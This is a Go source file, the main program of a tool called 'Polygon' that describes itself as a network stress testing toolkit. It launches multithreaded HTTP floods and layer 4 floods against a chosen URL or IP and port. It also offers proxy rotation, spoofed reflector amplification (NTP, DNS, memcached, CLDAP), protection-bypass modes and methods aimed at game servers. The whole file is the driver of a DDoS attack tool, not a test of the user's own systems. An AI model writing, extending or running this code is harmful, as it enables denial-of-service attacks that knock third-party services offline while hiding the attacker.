package main

import (
	"bufio"
	"context"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"Polygon/attack"
	"Polygon/config"
	"Polygon/console"
	"Polygon/methods"
	"Polygon/proxy"
	"Polygon/stats"
	"Polygon/tools"
)

const version = "1.0.0-go"

func main() {
	log.SetFlags(log.Ltime)

	if len(os.Args) < 2 {
		usage()
		os.Exit(1)
	}

	method := strings.ToUpper(os.Args[1])

	switch method {
	case "HELP":
		usage()
		return
	case "TOOLS":
		console.Run()
		return
	case "STOP":
		fmt.Println("Use Ctrl+C to stop all attacks.")
		return
	}

	cfg, err := config.Load(configPath())
	if err != nil {
		fatal("Cannot load config.json: %v", err)
	}

	if !methods.IsValid(method) {
		fatal("Method not found: %s", method)
	}

	if methods.IsLayer7(method) {
		runLayer7(method, cfg)
	} else if methods.IsLayer4(method) {
		runLayer4(method, cfg)
	}
}

func runLayer7(method string, cfg *config.Config) {
	if len(os.Args) < 8 {
		fatal("Usage: polygon <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration> [debug]")
	}
	targetURL := os.Args[2]
	if !strings.HasPrefix(targetURL, "http") {
		targetURL = "http://" + targetURL
	}

	proxyType, _ := strconv.Atoi(os.Args[3])
	threadCount, _ := strconv.Atoi(os.Args[4])
	proxyFile := os.Args[5]
	rpc, _ := strconv.Atoi(os.Args[6])
	duration, _ := strconv.Atoi(os.Args[7])

	if len(os.Args) >= 9 {
		log.SetFlags(log.Ltime | log.Lmicroseconds)
	}

	host, err := resolveHost(targetURL)
	if err != nil && method != "TOR" {
		fatal("Cannot resolve host: %v", err)
	}

	uagents := loadLines(filepath.Join(dataDir(), "useragent.txt"))
	referers := loadLines(filepath.Join(dataDir(), "referers.txt"))
	if len(uagents) == 0 {
		fatal("Empty useragent file")
	}
	if len(referers) == 0 {
		fatal("Empty referer file")
	}

	proxies := loadProxies(cfg, proxyFile, proxyType, targetURL)

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	log.Printf("Attack started → %s | method: %s | threads: %d | duration: %ds", targetURL, method, threadCount, duration)

	for i := 0; i < threadCount; i++ {
		flood := &attack.HTTPFlood{
			TargetURL:  targetURL,
			Host:       host,
			Method:     method,
			RPC:        rpc,
			UserAgents: uagents,
			Referers:   referers,
			Proxies:    proxies,
			ThreadID:   i,
		}
		go flood.Run(ctx)
	}

	statsLoop(ctx, targetURL, method, duration)
}

func runLayer4(method string, cfg *config.Config) {
	if len(os.Args) < 5 {
		fatal("Usage: polygon <method> <ip:port> <threads> <duration> [socks_type proxylist | reflector_file]")
	}
	target := os.Args[2]
	if !strings.HasPrefix(target, "http") {
		target = "http://" + target
	}

	// Parse host:port
	u, err := parseHostPort(target)
	if err != nil {
		fatal("Invalid target: %v", err)
	}
	ip, err := net.ResolveIPAddr("ip4", u.host)
	if err != nil {
		fatal("Cannot resolve %s: %v", u.host, err)
	}
	resolvedIP := ip.String()

	if u.port == 0 {
		log.Println("Port not specified, defaulting to 80")
		u.port = 80
	}
	threadCount, _ := strconv.Atoi(os.Args[3])
	duration, _ := strconv.Atoi(os.Args[4])

	if methods.NeedsRawSocket(method) && !tools.CheckRawSocket() {
		fatal("Cannot create raw socket — run as root or grant CAP_NET_RAW")
	}
	if methods.IsLayer4AMP(method) {
		log.Println("WARNING: AMP method requires spoofable servers — check reflector list")
	}

	localIPStr, _ := tools.LocalIP()
	localIP := net.ParseIP(localIPStr)

	var refs []string
	var proxies []proxy.Proxy
	protocolID := cfg.MinecraftDefaultProtocol

	if len(os.Args) >= 6 {
		arg5 := strings.TrimSpace(os.Args[5])
		if methods.IsLayer4AMP(method) {
			refs = loadIPs(filepath.Join(dataDir(), arg5))
			if len(refs) == 0 {
				fatal("Empty reflector file")
			}
		} else if pType, err := strconv.Atoi(arg5); err == nil && len(os.Args) >= 7 {
			proxyFile := os.Args[6]
			proxies = loadProxies(cfg, proxyFile, pType, "")
		}
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	log.Printf("Attack started → %s:%d | method: %s | threads: %d | duration: %ds",
		resolvedIP, u.port, method, threadCount, duration)

	for i := 0; i < threadCount; i++ {
		l4 := &attack.Layer4{
			Target:     resolvedIP,
			Port:       u.port,
			Method:     method,
			Refs:       refs,
			Proxies:    proxies,
			ProtocolID: protocolID,
			LocalIP:    localIP,
		}
		go l4.Run(ctx)
	}

	statsLoop(ctx, fmt.Sprintf("%s:%d", resolvedIP, u.port), method, duration)
}

func statsLoop(ctx context.Context, target, method string, duration int) {
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()
	start := time.Now()
	for {
		select {
		case <-ctx.Done():
			log.Printf("Attack finished — %s | %s", target, method)
			return
		case <-ticker.C:
			reqs, bytes := stats.Snapshot()
			stats.Reset()
			elapsed := int(time.Since(start).Seconds())
			pct := 0
			if duration > 0 {
				pct = elapsed * 100 / duration
			}
			log.Printf("Target: %s | Method: %s | PPS: %s | BPS: %s | %d%%",
				target, method,
				tools.HumanFormat(reqs),
				tools.HumanBytes(bytes),
				pct)
		}
	}
}

// ---- helpers ----------------------------------------------------------------

type hostPort struct {
	host string
	port uint16
}

func parseHostPort(rawURL string) (hostPort, error) {
	rawURL = strings.TrimPrefix(rawURL, "http://")
	rawURL = strings.TrimPrefix(rawURL, "https://")
	rawURL = strings.Split(rawURL, "/")[0]

	host, portStr, err := net.SplitHostPort(rawURL)
	if err != nil {
		return hostPort{host: rawURL}, nil
	}
	p, _ := strconv.Atoi(portStr)
	return hostPort{host: host, port: uint16(p)}, nil
}

func resolveHost(rawURL string) (string, error) {
	rawURL = strings.TrimPrefix(rawURL, "http://")
	rawURL = strings.TrimPrefix(rawURL, "https://")
	host := strings.Split(rawURL, "/")[0]
	host = strings.Split(host, ":")[0]
	addrs, err := net.LookupHost(host)
	if err != nil || len(addrs) == 0 {
		return host, err
	}
	return addrs[0], nil
}

func loadLines(path string) []string {
	f, err := os.Open(path)
	if err != nil {
		return nil
	}
	defer f.Close()
	var lines []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		if line := strings.TrimSpace(sc.Text()); line != "" {
			lines = append(lines, line)
		}
	}
	return lines
}

func loadIPs(path string) []string {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil
	}
	var ips []string
	for _, token := range strings.Fields(string(data)) {
		if net.ParseIP(strings.TrimSpace(token)) != nil {
			ips = append(ips, strings.TrimSpace(token))
		}
	}
	return ips
}

func loadProxies(cfg *config.Config, proxyFile string, proxyType int, testURL string) []proxy.Proxy {
	if proxyType == 6 {
		proxyType = []int{1, 4, 5}[rand.Intn(3)]
	}
	pt := proxy.Type(proxyType)

	fullPath := filepath.Join(dataDir(), "proxies", proxyFile)
	if _, err := os.Stat(fullPath); os.IsNotExist(err) {
		log.Println("Proxy file not found, downloading proxies...")
		if err := os.MkdirAll(filepath.Dir(fullPath), 0o755); err != nil {
			log.Printf("Cannot create proxy dir: %v", err)
		}
		proxies := proxy.DownloadFromConfig(cfg, proxyType)
		if testURL != "" {
			proxies = proxy.CheckAll(proxies, testURL, 5*time.Second, 200)
		}
		if len(proxies) == 0 {
			fatal("No working proxies found")
		}
		var sb strings.Builder
		for _, p := range proxies {
			sb.WriteString(p.String() + "\n")
		}
		if err := os.WriteFile(fullPath, []byte(sb.String()), 0o644); err != nil {
			log.Printf("Cannot write proxy file: %v", err)
		}
		return proxies
	}

	proxies, err := proxy.ReadFile(fullPath, pt)
	if err != nil || len(proxies) == 0 {
		log.Println("Proxy file empty, running without proxies")
		return nil
	}
	log.Printf("Loaded %d proxies", len(proxies))
	return proxies
}

func configPath() string {
	if _, err := os.Stat("config.json"); err == nil {
		return "config.json"
	}
	exe, _ := os.Executable()
	return filepath.Join(filepath.Dir(exe), "config.json")
}

func dataDir() string {
	if _, err := os.Stat("files"); err == nil {
		return "files"
	}
	exe, _ := os.Executable()
	return filepath.Join(filepath.Dir(exe), "files")
}

func fatal(format string, args ...any) {
	log.Printf("ERROR: "+format, args...)
	os.Exit(1)
}

func usage() {
	fmt.Printf(`Polygon v%s — network stress testing toolkit (Go rewrite)

Usage:
  L7:  polygon <method> <url> <socks_type> <threads> <proxylist> <rpc> <duration> [debug]
  L4:  polygon <method> <ip:port> <threads> <duration>
  L4 proxied: polygon <method> <ip:port> <threads> <duration> <socks_type> <proxylist>
  L4 amp:     polygon <method> <ip:port> <threads> <duration> <reflector_file>

Special:
  polygon TOOLS   — interactive console
  polygon HELP    — this message
  polygon STOP    — stop hint

Proxy types:  0=ALL  1=HTTP  4=SOCKS4  5=SOCKS5  6=RANDOM

Layer 7 methods (%d): CFB BYPASS GET POST OVH STRESS DYN SLOW HEAD NULL
  COOKIE PPS EVEN GSB DGB AVB CFBUAM APACHE XMLRPC BOT BOMB DOWNLOADER
  KILLER TOR RHEX STOMP

Layer 4 methods (%d): TCP UDP SYN VSE MINECRAFT MCBOT CONNECTION CPS
  FIVEM FIVEM-TOKEN TS3 MCPE ICMP OVH-UDP MEM NTP DNS ARD CLDAP CHAR RDP

Tools: INFO TSSRV CFIP DNS PING CHECK DSTAT
`, version, len(methods.Layer7), len(methods.Layer4))
}
